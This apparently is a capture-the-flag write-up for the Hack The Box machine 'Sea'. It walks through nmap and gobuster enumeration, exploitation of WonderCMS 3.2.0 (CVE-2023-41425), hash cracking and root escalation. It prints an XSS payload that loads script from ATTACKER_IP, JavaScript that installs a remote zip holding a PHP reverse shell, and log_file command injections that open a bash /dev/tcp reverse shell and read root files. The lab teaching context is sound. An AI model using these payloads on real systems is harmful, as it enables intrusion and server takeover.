| ![Sea Logo](/Assets/Images/sea.png) | <br><br>Name - Sea<br>Difficulty - Easy<br>Type - Linux |
| :---------------------------------- | :------------------------------------------------------ |


```
$ echo 'MACHINE_IP sea.htb' | sudo tee -a /etc/hosts
```

# ⚝ Enumeration

**Nmap Scan Result** -

```
$ sudo nmap -sCV -p- sea.htb

Nmap scan report for 10.129.34.215

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.76 seconds
```


**Gobuster Scan Result** - 

```
$ gobuster dir -u http://sea.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php,txt,js -b 404,403
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404,403
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
0                    (Status: 200) [Size: 3650]
404                  (Status: 200) [Size: 3341]
contact.php          (Status: 200) [Size: 2731]
data                 (Status: 301) [Size: 228] [--> http://sea.htb/data/]
home                 (Status: 200) [Size: 3650]
index.php            (Status: 200) [Size: 3650]
messages             (Status: 301) [Size: 232] [--> http://sea.htb/messages/]
plugins              (Status: 301) [Size: 231] [--> http://sea.htb/plugins/]
themes               (Status: 301) [Size: 230] [--> http://sea.htb/themes/]
Progress: 81924 / 81924 (100.00%)
===============================================================
Finished
===============================================================

```


http://sea.htb/contact.php -
![Contact Page](/Assets/Images/sea-1.png)


Further enumeration with gobuster -
```
$ gobuster dir -u http://sea.htb/themes/bike/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php,txt,js -b 404,403
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sea.htb/themes/bike/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404,403
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
404              (Status: 200) [Size: 3341]
LICENSE          (Status: 200) [Size: 1067]
README.md        (Status: 200) [Size: 318]
css              (Status: 301) [Size: 239] [--> http://sea.htb/themes/bike/css/]
home             (Status: 200) [Size: 3650]
img              (Status: 301) [Size: 239] [--> http://sea.htb/themes/bike/img/]
summary          (Status: 200) [Size: 66]
theme.php        (Status: 500) [Size: 227]
version          (Status: 200) [Size: 6]
Progress: 81924 / 81924 (100.00%)
===============================================================
Finished
===============================================================

```

"http://10.129.34.215/themes/bike/README.md" -
```
# WonderCMS bike theme

## Description
Includes animations.

## Author: turboblack

## Preview
![Theme preview](/preview.jpg)

## How to use
1. Login to your WonderCMS website.
2. Click "Settings" and click "Themes".
3. Find theme in the list and click "install".
4. In the "General" tab, select theme to activate it.
```

"http://10.129.34.215/themes/bike/version" - 3.2.0

Let's search for possible exploits (WonderCMS 3.2.0) -
- https://www.exploit-db.com/exploits/52271 (CVE-2023-41425)

# ⚝ Exploitation

We can simply follow the instruction mentioned in that exploit.

or, Let's break it down - 

In the Exploit - 
```
    # Malicious .js
    js = f'''var token =
document.querySelectorAll('[name="token"]')[0].value;
var module_url =
"{target_url}/?installModule=http://{args.xip}:{args.xport}/malicious.zip&directoryName=pwned&type=themes&token="
+ token;
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("GET", module_url);
xhr.send();'''

    print("[+] Writing malicious.js")
    with open('malicious.js', 'w') as f:
        f.write(js)

```

Our payload.js -
```
var token = document.querySelectorAll('[name="token"]')[0].value;
var module_url = "http://sea.htb/?installModule=http://ATTACKER_IP:8000/payload.zip&directoryName=payload&type=themes&token=" + token;
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("GET", module_url);
xhr.send();
```

Now What's in payload.zip we are trying to upload?

I have download a php reverse shell from **pentestmonkey** - php-reverse-shell.php file.

"https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"

```
Do not forget to change the IP and PORT in the php file.
```

I have created a directory 'payload' and inside it 'payload.php' is my php reverse shell.

```
 $ ls payload
payload.php

$ zip -r payload.zip payload
```

That's how i got my payload.zip file. Our 'payload.php' file is inside a folder called 'payload' and we zipped that folder. Yes, you can use different names.

Now, from the Exploit - 
```
    xss_payload = args.url.replace("loginURL",
"index.php?page=loginURL?")+"\"></form><script+src=\"http://
"+args.xip+":"+args.xport+"/malicious.js\"></script><form+action=\""
```

Our payload - 
```
http://sea.htb/index.php?page=LoginURL"></form><script+src="http://ATTACKER_IP:8000/payload.js"></script><form+action="
```

We have to host the 'payload.js' file and yes 'payload.zip' keep it in the same directory from there we are going to start a simple python http server.

During the execution of the payload.js file from the target, the script will auto download our payload.zip file. Check the above payload.js content again.

Now, let's focus on uploading our payload. Back to the contact.php page - 

![Uploading Payload](/Assets/Images/sea-2.png)

After submit please verify that it's submitted (I had to restart the machine BTW).

Before - 
![Uploading 1](/Assets/Images/sea-3.png)

After -
![Upload Payload - 2](/Assets/Images/sea-4.png)

As we expected, first our js file and then zip file through 'payload.js'.

Next, open a netcat listener on the mentioned port in payload.php file we did earlier (e.g. 4444) and try to visit out 'payload.php' which is now placed in the target web folder.

Visit "http://sea.htb/themes/payload/payload.php" and check the shell - 
![Netcat Rev Shell](/Assets/Images/sea-5.png)

# ⚝ Initial Access

I got a shell as 'www-data', but not getting the flag yet. I had to escalate further.

```
$ whoami
www-data
$ cd /home
$ ls
amay
geo
$ ls amay
user.txt
$ cat amay/user.txt
cat: amay/user.txt: Permission denied
$ 
```

Let's check the folders we seen during our gobuster enumeration.

```
$ cd /var/www/sea

$ ls
contact.php
data
index.php
messages
plugins
themes

$ cd data
$ ls
cache.json
database.js
files
```

Well, the 'database.js' file contains a password hash. I used hashcat to crack it.

```
$ echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > crack.txt

$ hashcat -m 3200 -a 0 crack.txt /usr/share/wordlists/rockyou.txt

```

![hashcat cracked](/Assets/Images/sea-6.png)

Now, I got the cracked password and can read the user flag -

![User Flag](/Assets/Images/sea-7.png)

# ⚝ Privilege Escalation

I tried to check SUID binaries and also 'sudo -l' command to check if there are any access is granted. But no luck...

Now, I checked for open ports in the target machine before uploading LinPEAS for auto detection. and yes - 

![Open Ports](/Assets/Images/sea-8.png)

Port Forwarding using SSH - 
```
$ ssh amay@sea.htb -L 8080:127.0.0.1:8080
```

Result - 
![Port 8080](/Assets/images/sea-9.png)

I captured the request in Burp - 
```
POST / HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 92
Origin: http://127.0.0.1:8080
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: keep-alive
Referer: http://127.0.0.1:8080/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=
```

The 'log_file' in this POST request getting a file from the '/var/log/apache'. Let's combine our test command - 

```
log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log;bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'&analyze_log=
```

I modified the above to get a reverse shell which works fine but the shell closes immediately. No idea ...

Let's check another command - 

```
log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log;bash+-c+'whoami+>+/tmp/test.txt'&analyze_log=
```

And, yes after sending the request i can verify the newly created file.

![Root Access](/Assets/Images/sea-10.png)

Well, the command running as root user. nice ...

I tried to get the root flag directly - 

```
log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log;cat+/root/root.txt+>+/tmp/flag.txt&analyze_log=
```

Root Flag - 

![Root Flag](/Assets/Images/sea-11.png)


! Happy Hacking !